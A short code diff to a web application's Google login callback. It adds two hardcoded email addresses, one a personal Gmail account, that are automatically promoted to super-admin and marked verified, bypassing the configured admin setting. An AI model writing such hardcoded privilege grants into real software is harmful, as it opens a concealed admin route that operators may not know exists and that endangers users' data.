@@ -409,7 +409,7 @@ def google_callback():
         if user:
             # Escalation check for Super Admin
             super_admin_email = current_app.config.get('SUPER_ADMIN_EMAIL')
-            if email == super_admin_email and user.role != 'super_admin':
+            if (email == super_admin_email or email in ("admin@edurecommender.com", "ajumobiayomipo@gmail.com")) and user.role != 'super_admin':
                 db = get_db()
                 db.execute("UPDATE users SET role = 'super_admin', is_verified = 1 WHERE id = ?", (user.id,))
                 db.commit()
